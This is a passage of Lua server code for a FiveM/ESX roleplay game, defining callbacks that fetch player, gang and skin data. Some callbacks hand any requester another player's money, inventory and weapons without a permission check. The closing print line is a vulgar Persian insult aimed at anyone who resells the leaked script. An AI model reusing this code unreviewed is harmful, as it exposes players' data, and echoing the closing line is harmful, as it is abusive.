	cb({
		identifier   = xPlayer.identifier,
		inventory    = xPlayer.inventory,
		job          = xPlayer.job,
		loadout      = xPlayer.loadout,
		lastPosition = xPlayer.coords,
		money        = xPlayer.money
	})
end)

ESX.RegisterServerCallback('esx:getOtherPlayerDataCard', function(source, cb, target)

	local xPlayer = ESX.GetPlayerFromId(target)

	local identifier = GetPlayerIdentifiers(target)[1]

	local result = MySQL.Sync.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {
		['@identifier'] = identifier
	})

	local name 		= result[1].playerName
	local dob       = result[1].dateofbirth
	local height    = result[1].height
	local sex

	if result[1].skin ~= nil then
		skin = json.decode(result[1].skin)
		local isMale = skin.sex == 0
		if isMale then sex = 'مذکر' else sex = 'مونث' end
	end

	local data = {
		name      = name,
		money	  = xPlayer.money,
		job       = xPlayer.job,
		inventory = xPlayer.inventory,
		weapons   = xPlayer.loadout,
		sex       = sex
	}

	TriggerEvent('esx_status:getStatus', target, 'drunk', function(status)
		if status ~= nil then
			data.drunk = math.floor(status.percent)
		end
	end)

	TriggerEvent('esx_license:getLicenses', target, function(licenses)
		data.licenses = licenses
		cb(data)
	end)

end)

ESX.RegisterServerCallback('nameAvalibity', function(source, cb, name)
	exports.ghmattimysql:execute('SELECT * FROM users WHERE `playerName` = @playerName', {
		['playerName']	= name
	}, function(result)
		if result[1] then
			cb(false)
		else
			cb(true)
		end
	end)
end)

ESX.RegisterServerCallback('esx_eden_clotheshop:checkPropertyDataStore', function(source, cb)

	local xPlayer    = ESX.GetPlayerFromId(source)
	local foundStore = false
	local foundGang	 = false

	TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
		foundStore = true
	end)
	if xPlayer.gang.name ~= 'nogang' and xPlayer.gang.grade == 6 then
		foundGang = {}
		for i=1, #ESX.Gangs[xPlayer.gang.name].grades do
			table.insert(foundGang, 
			{
				label = ESX.Gangs[xPlayer.gang.name].grades[i].label, 
				grade = i
			}
		)
		end
	end
	cb(foundStore, foundGang)

end)

ESX.RegisterServerCallback('esx:checkDeath', function(source, cb, target)
	local xPlayer = ESX.GetPlayerFromId(target)

	cb(xPlayer.IsDead)
end)

ESX.RegisterServerCallback('esx:checkInjure', function(source, cb, target)
	local xPlayer = ESX.GetPlayerFromId(target)

	cb(xPlayer.Injure)
end)

ESX.RegisterServerCallback('esx_skin:getGangSkin', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	exports.ghmattimysql:scalar('SELECT skin FROM users WHERE identifier = @identifier', {
		['@identifier'] = xPlayer.identifier
	}, function(skin)
		local gangSkin = {
			skin_male   = json.decode(ESX.Gangs[xPlayer.gang.name].grades[tonumber(xPlayer.gang.grade)].skin_male),
			skin_female = json.decode(ESX.Gangs[xPlayer.gang.name].grades[tonumber(xPlayer.gang.grade)].skin_female)
		}

		if skin ~= nil then
			skin = json.decode(skin)
		end

		cb(skin, gangSkin)
	end)
end)

-- TriggerEvent("es:addGroup", "jobmaster", "user", function(group) end)

-- ESX.StartDBSync()
ESX.StartPayCheck()
print('Kiram To Sath AT o Server Zadanesh \n In Resource Tavasot xCoore Public Shode Va Hargone Foroshesh Neshan Dahande Madar Jende Bodanetone')